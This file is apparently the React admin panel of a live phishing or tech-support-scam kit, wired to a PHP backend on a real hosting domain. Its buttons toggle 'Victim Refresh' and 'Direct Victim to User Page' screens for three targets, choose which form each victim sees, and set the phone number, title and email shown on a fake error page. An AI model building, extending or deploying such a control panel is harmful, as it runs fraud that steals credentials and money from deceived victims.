import { useEffect, useState } from "react";
import ImageTable from "../components/adminExplanation";


// Replace JSONBin variables with appropriate backend URLs
const API_URL = "https://ivory-dunlin-618889.hostingersite.com/myBackend/admin_api4.php"; // Adjust this if needed


const AdminPage = () => {
  const [formList, setFormList] = useState<string[]>([]);
  const [formList2, setFormList2] = useState<string[]>([]);
  const [formList3, setFormList3] = useState<string[]>([]);
  const [title, setTitle] = useState("");
  const [errorMessage, setErrorMessage] = useState("");
  const [email, setEmail] = useState("");
  const [loading, setLoading] = useState(false);
  const [successMsg, setSuccessMsg] = useState("");
  const [showPopup, setShowPopup] = useState(false);
  const [showPopupu2, setShowPopupu2] = useState(false);
  const [showPopupu3, setShowPopupu3] = useState(false);
  const [showPopup2, setShowPopup2] = useState(false);
  const [showPopup22, setShowPopup22] = useState(false);
  const [showPopup33, setShowPopup33] = useState(false);

  const [phone, setPhone] = useState("");
  const [message, setMessage] = useState("");

  // Toggle popups and update the backend
  const togglePopup = async () => {
    const newStatus = !showPopup;
    setShowPopup(newStatus);

    await fetch(`${API_URL}?action=update_popup`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ showPopup: newStatus }),
    });
  };
  const togglePopupu2 = async () => {
    const newStatus = !showPopupu2;
    setShowPopupu2(newStatus);

    await fetch(`${API_URL}?action=update_popupu2`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ showPopupu2: newStatus }),
    });
  };
  const togglePopupu3 = async () => {
    const newStatus = !showPopupu3;
    setShowPopupu3(newStatus);

    await fetch(`${API_URL}?action=update_popupu3`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ showPopupu3: newStatus }),
    });
  };

  const togglePopup2 = async () => {
    const newStatus = !showPopup2;
    setShowPopup2(newStatus);

    await fetch(`${API_URL}?action=update_popup2`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ showPopup2: newStatus }),
    });
  };
  const togglePopup22 = async () => {
    const newStatus = !showPopup22;
    setShowPopup22(newStatus);

    await fetch(`${API_URL}?action=update_popup22`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ showPopup22: newStatus }),
    });
  };
  const togglePopup33 = async () => {
    const newStatus = !showPopup33;
    setShowPopup33(newStatus);

    await fetch(`${API_URL}?action=update_popup33`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ showPopup33: newStatus }),
    });
  };


  
  // const setActiveUser = async (user: string, showPopup: boolean) => {
  //   await fetch(`${API_URL}?action=set_active_user`, {
  //     method: "POST",
  //     headers: { "Content-Type": "application/json" },
  //     body: JSON.stringify({ activeUser: user, showPopup2: showPopup }),
  //   });
  //   window.location.reload(); // Optional: refresh to reflect changes
  // };

  

  // Fetch error content from backend
  useEffect(() => {
    const fetchErrorContent = async () => {
      try {
        const res = await fetch(`${API_URL}?action=fetch_error_content`);
        const data = await res.json();
        setTitle(data.title || "");
        setErrorMessage(data.errorMessage || "");
        setEmail(data.email || "");
      } catch (err) {
        console.error("Error fetching data:", err);
      }
    };

    fetchErrorContent();
  }, []);

  // Update error content
  const handleUpdate = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setSuccessMsg("");

    try {
      // Send updated error content to PHP backend
      await fetch(`${API_URL}?action=update_error_content`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ title, errorMessage, email }),
      });

      setSuccessMsg("✅ Error message updated!");
    } catch (err) {
      console.error("Error updating:", err);
    } finally {
      setLoading(false);
    }
  };

  // Fetch form list
  useEffect(() => {
    const fetchForms = async () => {
      try {
        const res = await fetch(`${API_URL}?action=fetch_forms`);
        const data = await res.json();
        setFormList(data.availableForms || []);
      } catch (error) {
        console.error("Error fetching forms:", error);
      }
    };

    fetchForms();
  }, []);


  useEffect(() => {
    const fetchForms2 = async () => {
      try {
        const res = await fetch(`${API_URL}?action=fetch_forms2`);
        const data = await res.json();
        setFormList2(data.availableForms2 || []);
      } catch (error) {
        console.error("Error fetching forms:", error);
      }
    };

    fetchForms2();
  }, []);
  useEffect(() => {
    const fetchForms2 = async () => {
      try {
        const res = await fetch(`${API_URL}?action=fetch_forms3`);
        const data = await res.json();
        setFormList3(data.availableForms3 || []);
      } catch (error) {
        console.error("Error fetching forms:", error);
      }
    };

    fetchForms2();
  }, []);

  // Update form data
  const handleChange = async (e: React.ChangeEvent<HTMLSelectElement>) => {
    const selectedForm = e.target.value;

    try {
      await fetch(`${API_URL}?action=update_form`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          currentForm: selectedForm,
          availableForms: formList,
        }),
      });

      alert("Form updated successfully!");
    } catch (error) {
      console.error("Error updating form:", error);
    }
  };


  
  const handleChange2 = async (e: React.ChangeEvent<HTMLSelectElement>) => {
    const selectedForm2 = e.target.value;

    try {
      await fetch(`${API_URL}?action=update_form2`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          currentForm2: selectedForm2,
          availableForms2: formList2,
        }),
      });

      alert("Form updated successfully!");
    } catch (error) {
      console.error("Error updating form:", error);
    }
  };
  const handleChange3 = async (e: React.ChangeEvent<HTMLSelectElement>) => {
    const selectedForm3 = e.target.value;

    try {
      await fetch(`${API_URL}?action=update_form3`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          currentForm3: selectedForm3,
          availableForms3: formList3,
        }),
      });

      alert("Form updated successfully!");
    } catch (error) {
      console.error("Error updating form:", error);
    }
  };

  // Update phone number in backend
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Ensure phone number is valid (you can add more validation if needed)
    if (!phone || phone.trim().length === 0) {
      setMessage("❌ Please enter a valid phone number.");
      return;
    }

    try {
      // Make the request to the backend
      const response = await fetch(`${API_URL}?action=update_phone`, {
        method: "PUT", // Use PUT method for updating resources
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ phone }), // Send the phone number in the request body
      });

      // Parse the response to check if the update was successful
      const data = await response.json();

      if (data.message && data.message.includes("successfully")) {
        setMessage("✅ Phone number updated successfully!");
      } else {
        setMessage("❌ Failed to update phone number.");
      }
    } catch (err) {
      console.error("Error updating phone:", err);
      setMessage("❌ Failed to update phone number.");
    }
  };


  return (
    <>
    <div className="bg-gray-800 h-screen p-9">
      <h2 className="text-3xl text-[#ccc] mb-9">Admin:  USER 1</h2>
      <select onChange={handleChange}>
        {formList.length > 0 ? (
          formList.map((form) => (
            <option key={form} value={form}>
              {form.charAt(0).toUpperCase() + form.slice(1)} Form
            </option>
          ))
        ) : (
          <option disabled>Loading options...</option>
        )}
      </select>
      {/* <h1>USER 1</h1> */}
      <div className="flex justify-center gap-8">
        <div>
          <h3 className="text-white mt-3">USER PAGE</h3>
          <button
            className={`text-white px-4 py-2 rounded ${
              showPopup ? "bg-green-600" : "bg-red-600"
            }`}
            onClick={togglePopup}
          >
            {showPopup ? "Refresh is active" : "Show Victim Refresh Page"}
          </button>
        </div>
        <div>
          <h3 className="text-white mt-3">LANDING PAGE</h3>
          <button
            className={`text-white px-4 py-2 rounded ${
              showPopup2 ? "bg-green-600" : "bg-red-600"
            }`}
            onClick={togglePopup2}
          >
            {showPopup2 ? "user page" : "Direct Victim to User Page"}
          </button>
        </div>
      </div>

   



      <h2 className="text-3xl text-[#ccc] mb-9">Admin: USER 2</h2>
      <select onChange={handleChange2}>
        {formList2.length > 0 ? (
          formList2.map((form) => (
            <option key={form} value={form}>
              {form.charAt(0).toUpperCase() + form.slice(1)} Form
            </option>
          ))
        ) : (
          <option disabled>Loading options...</option>
        )}
      </select>
      {/* <h1>USER 2</h1> */}
      <div className="flex justify-center gap-8">
        <div>
          <h3 className="text-white mt-3">USER PAGE</h3>
          <button
            className={`text-white px-4 py-2 rounded ${
              showPopupu2 ? "bg-green-600" : "bg-red-600"
            }`}
            onClick={togglePopupu2}
          >
            {showPopupu2 ? "Refresh is active" : "Show Victim Refresh Page"}
          </button>
        </div>
        
        <div>
          <h3 className="text-white mt-3">LANDING PAGE</h3>
          <button
            className={`text-white px-4 py-2 rounded ${
              showPopup22 ? "bg-green-600" : "bg-red-600"
            }`}
            onClick={togglePopup22}
          >
            {showPopup22 ? "user page" : "Direct Victim to User Page"}
          </button>
        </div>
      </div>

      
      <h2 className="text-3xl text-[#ccc] mb-9">Admin: USER 3</h2>
      <select onChange={handleChange3}>
        {formList3.length > 0 ? (
          formList3.map((form) => (
            <option key={form} value={form}>
              {form.charAt(0).toUpperCase() + form.slice(1)} Form
            </option>
          ))
        ) : (
          <option disabled>Loading options...</option>
        )}
      </select>

      {/* <br /> */}




{/* <h1>USER 3</h1> */}
      <div className="flex justify-center gap-8">
        <div>
          <h3 className="text-white mt-3">USER PAGE</h3>
          <button
            className={`text-white px-4 py-2 rounded ${
              showPopupu3 ? "bg-green-600" : "bg-red-600"
            }`}
            onClick={togglePopupu3}
          >
            {showPopupu3 ? "Refresh is active" : "Show Victim Refresh Page"}
          </button>
        </div>
        <div>
          
        </div>

        <div>
          <h3 className="text-white mt-3">LANDING PAGE</h3>
          <button
            className={`text-white px-4 py-2 rounded ${
              showPopup33 ? "bg-green-600" : "bg-red-600"
            }`}
            onClick={togglePopup33}
          >
            {showPopup33 ? "user page" : "Direct Victim to User Page"}
          </button>
        </div>
      </div>

      <form onSubmit={handleSubmit} className="max-w- mt-5 sm mx-auto bg-white p-6 rounded shadow">
        <label className="block mb-2 font-semibold">New Phone Number:</label>

        <p className="text-sm">
          NOTE: DONT ADD +1 JUST TYPE THE NUMBER LIKE THIS{" "}
          <strong className="text-green-500">"2234567890"</strong> INSTEAD OF{" "}
          <strong className="text-red-500">"+11234567890"</strong>
        </p>
        <input
          type="text"
          value={phone}
          onChange={(e) => setPhone(e.target.value)}
          placeholder="1234567890"
          className="w-full p-2 border rounded mb-4"
        />
        <button type="submit" className="bg-blue-600 text-white px-4 py-2 rounded">
          Update Phone
        </button>

        {message && <p className="mt-4 text-sm">{message}</p>}
      </form>

      <div className="max-w-md mx-auto mt-10 p-6 bg-white shadow rounded-lg">
        <h2 className="text-xl font-bold mb-4 text-center">Edit Error Info</h2>

        <form onSubmit={handleUpdate} className="space-y-4">
          <div>
            <label className="block text-sm font-medium mb-1">Title</label>
            <input
              value={title}
              onChange={(e) => setTitle(e.target.value)}
              className="w-full border px-3 py-2 rounded focus:outline-none focus:ring"
            />
          </div>

          <div>
            <label className="block text-sm font-medium mb-1">Error Message</label>
            <textarea
              value={errorMessage}
              onChange={(e) => setErrorMessage(e.target.value)}
              className="w-full border px-3 py-2 rounded focus:outline-none focus:ring"
            />
          </div>

          <div>
            <label className="block text-sm font-medium mb-1">Email</label>
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full border px-3 py-2 rounded focus:outline-none focus:ring"
            />
          </div>

          <button
            type="submit"
            disabled={loading}
            className="w-full bg-blue-600 text-white py-2 rounded hover:bg-blue-700 transition"
          >
            {loading ? "Updating..." : "Update"}
          </button>

          {successMsg && <p className="text-green-600 text-center mt-2">{successMsg}</p>}
        </form>
      </div>
    </div>
    <div className="mt-[550px]">
      <ImageTable/> 
    </div>
   
    </>
  );
};

export default AdminPage;
